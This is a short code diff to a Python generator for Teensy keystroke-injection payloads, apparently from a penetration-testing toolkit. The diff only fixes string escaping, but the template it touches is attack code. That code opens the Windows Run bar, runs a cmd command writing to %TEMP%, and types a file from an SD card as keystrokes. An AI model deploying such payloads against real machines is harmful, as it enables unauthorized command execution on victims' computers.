@@ -110,7 +110,7 @@ vbs = core.generate_random_string(10, 15) + ".vbs"
 bat = core.generate_random_string(10, 15) + ".bat"
 
 # write the rest of the teensy code
-output_variable += ("""
+output_variable += (r"""
 
 #include <avr/pgmspace.h>
 #include <SD.h>
@@ -119,7 +119,7 @@ output_variable += ("""
 int ledPin = 6;
 
 void setup()
-{
+{{
   BlinkFast(2);
   delay(5000);
   CommandAtRunBar("cmd /c echo 0 > %TEMP%\\\\{random_filename}");
@@ -149,7 +149,7 @@ void setup()
   long int filePos;
   long int fileSize;
   File dataFile = SD.open("converts.txt");
-  if (dataFile) {
+  if (dataFile) {{
     fileSize = dataFile.size();
     for (filePos = 0; filePos <= fileSize; filePos++) {{
       Keyboard.print(dataFile.read(),BYTE);
@@ -182,7 +182,7 @@ void setup()
   Keyboard.println("exit");
 }}
 void loop () {{}}
-void BlinkFast(int BlinkRate){
+void BlinkFast(int BlinkRate){{
   int BlinkCounter=0;
   for(BlinkCounter=0; BlinkCounter!=BlinkRate; BlinkCounter++){{
     digitalWrite(ledPin, HIGH);
